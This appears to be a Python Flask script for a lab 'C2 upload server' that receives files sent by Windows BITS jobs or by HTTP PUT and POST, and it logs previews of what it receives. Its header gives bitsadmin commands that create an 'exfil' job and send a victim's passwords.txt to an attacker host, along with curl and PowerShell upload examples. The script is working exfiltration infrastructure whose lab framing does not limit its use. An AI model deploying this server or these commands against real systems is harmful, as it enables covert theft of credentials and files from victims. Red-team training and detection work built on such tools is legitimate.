#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║       LEVIATHAN LAB — C2 Simulated Upload Server             ║
║       FOR EXCLUSIVE USE in isolated laboratory environments! ║
╚══════════════════════════════════════════════════════════════╝
 
Install dependencies:
    pip3 install flask colorama
 
Start server (port 80 requires root privileges):
    sudo python3 c2_server.py               # port 80 (recommended for BITS)
    python3 c2_server.py --port 8080        # alternative port without root
 
────────────────────────────────────────────────────────────────
 Windows Commands (Victim VM) — BITS UPLOAD JOB
────────────────────────────────────────────────────────────────
  # Create the UPLOAD job (the /upload flag is mandatory!)
  bitsadmin /create /upload exfil
 
  # Add file: FIRST argument = remote URL, SECOND = local path
  bitsadmin /addfile exfil http://<UBUNTU_IP>/upload/passwords.txt C:\\Users\\victim\\Documents\\passwords.txt
 
  # Start the transfer
  bitsadmin /resume exfil
 
  # Check job status (Blue Team)
  bitsadmin /list /allusers /verbose
────────────────────────────────────────────────────────────────
"""
 
from flask import Flask, request, make_response, jsonify
from pathlib import Path
from datetime import datetime
import logging
import argparse
import uuid
import sys
 
# ─────────────────────────────────────────────────────────────
# Global Configuration
# ─────────────────────────────────────────────────────────────
UPLOAD_DIR   = Path("received_files")
LOG_FILE     = Path("c2_server.log")
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 80
 
app = Flask(__name__)
 
# In-memory dictionary for active BITS sessions
# { "{GUID}": { filename, filepath, received, total, started, done } }
bits_sessions: dict = {}
 
 
# ─────────────────────────────────────────────────────────────
# Logger — colored console + flat file
# ─────────────────────────────────────────────────────────────
RESET  = "\033[0m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
 
class ColourFormatter(logging.Formatter):
    _MAP = {
        "DEBUG":    CYAN,
        "INFO":     GREEN,
        "WARNING":  YELLOW,
        "ERROR":    RED,
        "CRITICAL": f"{RED}{BOLD}",
    }
    def format(self, record: logging.LogRecord) -> str:
        colour = self._MAP.get(record.levelname, "")
        return f"{colour}{super().format(record)}{RESET}"
 
def _build_logger() -> logging.Logger:
    log = logging.getLogger("C2")
    log.setLevel(logging.DEBUG)
    fmt = "%(asctime)s  %(levelname)-8s  %(message)s"
 
    # File handler (no colors, UTF-8)
    fh = logging.FileHandler(LOG_FILE, encoding="utf-8")
    fh.setFormatter(logging.Formatter(fmt))
 
    # Console handler (with colors)
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(ColourFormatter(fmt))
 
    log.addHandler(fh)
    log.addHandler(ch)
 
    # Reduce Werkzeug noise
    logging.getLogger("werkzeug").setLevel(logging.WARNING)
    return log
 
logger = _build_logger()
 
 
# ─────────────────────────────────────────────────────────────
# Utility Functions
# ─────────────────────────────────────────────────────────────
def safe_name(raw: str) -> str:
    """Sanitizes the filename — prevents directory traversal."""
    name = Path(raw).name
    return name if name else "unknown_file"
 
 
def log_request() -> None:
    """Logs relevant details of the current request."""
    headers_of_interest = [
        "BITS-Session-Id",
        "BITS-Packet-Type",
        "BITS-Supported-Protocols",
        "Content-Range",
        "Content-Length",
        "Content-Name",
        "User-Agent",
    ]
    logger.info("─" * 58)
    logger.info(f"▶  {request.method:<12} {request.path}   ←  {request.remote_addr}")
    for h in headers_of_interest:
        val = request.headers.get(h)
        if val:
            logger.info(f"   {h}: {val}")
 
 
# ─────────────────────────────────────────────────────────────
# Handler — BITS Upload Protocol
# ─────────────────────────────────────────────────────────────
def handle_bits(filename: str):
    """
    Minimal implementation of the BITS Upload Protocol.
 
    Protocol flow:
      1. Ping (empty body, no session-id)   → server allocates session
      2. Data fragment(s) via Content-Range → server accumulates bytes
      3. Close-Session                      → server finalizes the file
    """
    pkt_type    = request.headers.get("BITS-Packet-Type", "").lower()
    session_hdr = request.headers.get("BITS-Session-Id", "")
    c_length    = request.content_length or 0
    c_range     = request.headers.get("Content-Range", "")
    c_name      = request.headers.get("Content-Name", filename)
 
    safe        = safe_name(c_name)
    filepath    = UPLOAD_DIR / safe
 
    # ── Phase 1: Session initiation (Ping) ──────────────────────────
    if pkt_type == "ping" or (c_length == 0 and not session_hdr):
        UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
 
        sid = f"{{{str(uuid.uuid4()).upper()}}}"
        bits_sessions[sid] = {
            "filename": safe,
            "filepath": filepath,
            "received": 0,
            "total":    None,
            "started":  datetime.now(),
            "done":     False,
        }
        filepath.write_bytes(b"")  # Create empty file (ready for append)
 
        logger.warning(f"🎯  BITS SESSION CREATED")
        logger.warning(f"    Session ID   : {sid}")
        logger.warning(f"    Target file  : {safe}")
        logger.warning(f"    Saved in     : {filepath.resolve()}")
 
        r = make_response("", 200)
        r.headers["BITS-Protocol"]               = "{7df0354d-249b-430f-820d-3d2a9bef4931}"
        r.headers["BITS-Session-Id"]             = sid
        r.headers["BITS-Received-Content-Range"] = "none"
        r.headers["BITS-Reply-URL"]              = request.url
        r.headers["Accept-Ranges"]               = "bytes"
        return r
 
    # ── Phase 3: Close session (Close-Session) ─────────────────
    if pkt_type == "close-session":
        sess = bits_sessions.get(session_hdr)
        if sess and not sess["done"]:
            sess["done"] = True
            sz = filepath.stat().st_size if filepath.exists() else 0
            duration = datetime.now() - sess["started"]
 
            logger.warning(f"✅  TRANSFER COMPLETE")
            logger.warning(f"    File     : {sess['filename']}  ({sz} bytes)")
            logger.warning(f"    Duration : {duration}")
            logger.warning(f"    Saved    : {filepath.resolve()}")
 
            # Text content preview (max 400 characters)
            try:
                preview = filepath.read_text(encoding="utf-8", errors="replace")[:400]
                logger.warning(f"    ── File content ─────────────────────────")
                for line in preview.splitlines():
                    logger.warning(f"    {line}")
                logger.warning(f"    ─────────────────────────────────────────")
            except Exception:
                pass
 
        r = make_response("", 200)
        r.headers["BITS-Session-Id"] = session_hdr
        return r
 
    # ── Phase 2: Data fragment ──────────────────────────────────
    sid  = session_hdr
    sess = bits_sessions.get(sid)
 
    # Unknown session — fallback, save anyway
    if not sess:
        logger.error(f"❌  Unknown BITS session: {sid} — saving as fallback")
        UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
        data = request.get_data()
        with open(UPLOAD_DIR / safe_name(filename), "ab") as f:
            f.write(data)
        r = make_response("", 200)
        r.headers["BITS-Session-Id"] = sid
        return r
 
    data = request.get_data()
    with open(sess["filepath"], "ab") as f:
        f.write(data)
    sess["received"] += len(data)
 
    # Parse the total from: Content-Range: bytes 0-1023/4096
    if c_range:
        try:
            total_str = c_range.split("/")[1]
            if total_str.strip() != "*":
                sess["total"] = int(total_str)
        except (IndexError, ValueError):
            pass
 
    received = sess["received"]
    total    = sess.get("total")
    logger.info(f"📦  Chunk received  +{len(data):<8} bytes  │  "
                f"progress: {received}/{total if total else '?'}")
 
    # Auto-finalize if explicit Close-Session is missing
    if total and received >= total and not sess["done"]:
        sess["done"] = True
        logger.warning(f"✅  TRANSFER COMPLETE (auto)  │  "
                       f"{sess['filename']}  │  {received} bytes")
 
    range_end = received - 1
    r = make_response("", 200)
    r.headers["BITS-Session-Id"]             = sid
    r.headers["BITS-Received-Content-Range"] = (
        f"0-{range_end}/{total}" if total else f"0-{range_end}/*"
    )
    return r
 
 
# ─────────────────────────────────────────────────────────────
# Handler — Standard HTTP Upload (fallback)
# ─────────────────────────────────────────────────────────────
def handle_standard_upload(filename: str):
    """
    Accepts files via standard POST/PUT.
    Useful for quick testing with curl or PowerShell Invoke-WebRequest.
 
    Testing from Ubuntu:
        curl -X PUT --data-binary @/etc/hostname http://localhost/upload/test.txt
 
    Testing from Windows (PowerShell):
        Invoke-WebRequest -Uri "http://<IP>/upload/test.txt" `
            -Method PUT -InFile "C:\\path\\to\\file.txt"
    """
    safe = safe_name(filename)
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
    filepath = UPLOAD_DIR / safe
 
    # Multipart form-data (curl -F "file=@path")
    if request.files:
        f = next(iter(request.files.values()))
        f.save(filepath)
        sz = filepath.stat().st_size
        logger.warning(f"✅  UPLOAD (multipart)  │  {safe}  │  {sz} bytes")
        return make_response(f"OK: {safe}\n", 200)
 
    # Raw body — PUT/POST with octet-stream
    data = request.get_data()
    if data:
        filepath.write_bytes(data)
        logger.warning(f"✅  UPLOAD (raw body)  │  {safe}  │  {len(data)} bytes")
        return make_response(f"OK: {safe}\n", 200)
 
    logger.warning("⚠   Request received without body")
    return make_response("No content received\n", 400)
 
 
# ─────────────────────────────────────────────────────────────
# Flask Routes
# ─────────────────────────────────────────────────────────────
@app.route("/upload/<path:filename>", methods=["GET", "POST", "PUT", "BITS_POST"])
def upload_route(filename: str):
    """
    Main upload endpoint.
    Automatically detects if the request comes from BITS or a standard HTTP client.
    """
    log_request()
 
    # Detect BITS via method or protocol-specific headers
    is_bits = (
        request.method == "BITS_POST"
        or "BITS-Session-Id"          in request.headers
        or "BITS-Packet-Type"         in request.headers
        or "BITS-Supported-Protocols" in request.headers
    )
 
    if is_bits:
        return handle_bits(filename)
 
    if request.method in ("POST", "PUT"):
        return handle_standard_upload(filename)
 
    # GET — simple response (BITS may perform GET probes before upload)
    return make_response("C2 server ready\n", 200)
 
 
@app.route("/status")
def status_route():
    """JSON Dashboard — received files and active BITS sessions."""
    files = []
    if UPLOAD_DIR.exists():
        for f in sorted(UPLOAD_DIR.iterdir()):
            if f.is_file():
                files.append({
                    "name":  f.name,
                    "bytes": f.stat().st_size,
                    "time":  datetime.fromtimestamp(
                                 f.stat().st_mtime
                             ).strftime("%Y-%m-%d %H:%M:%S"),
                })
 
    sessions_info = {
        sid: {
            "filename": s["filename"],
            "received": s["received"],
            "total":    s["total"],
            "done":     s["done"],
            "started":  s["started"].strftime("%H:%M:%S"),
        }
        for sid, s in bits_sessions.items()
    }
 
    return jsonify({
        "server_status":   "running",
        "received_files":  files,
        "bits_sessions":   sessions_info,
    })
 
 
@app.route("/")
def root():
    return make_response(
        "Leviathan Lab — C2 Upload Server (educational use only)\n", 200
    )
 
 
# ─────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Leviathan Lab C2 Upload Server"
    )
    parser.add_argument("--host", default=DEFAULT_HOST,
                        help="Listening address (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT,
                        help="Port (default: 80; port 80 requires sudo)")
    args = parser.parse_args()
 
    UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
 
    logger.warning("═" * 60)
    logger.warning("   ⚠  LEVIATHAN LAB — C2 UPLOAD SERVER  ⚠")
    logger.warning("   EXCLUSIVELY for educational use in isolated labs!")
    logger.warning("═" * 60)
    logger.info(f"   Listening on  :  http://{args.host}:{args.port}")
    logger.info(f"   Upload dir    :  {UPLOAD_DIR.resolve()}")
    logger.info(f"   Log file      :  {LOG_FILE.resolve()}")
    logger.info("")
    logger.info("   Available endpoints:")
    logger.info("     BITS_POST / PUT / POST   →  /upload/<filename>")
    logger.info("     GET                      →  /status  (JSON dashboard)")
    logger.info("═" * 60)
 
    app.run(
        host=args.host,
        port=args.port,
        debug=False,
        threaded=True,   # Supports concurrent requests
    )
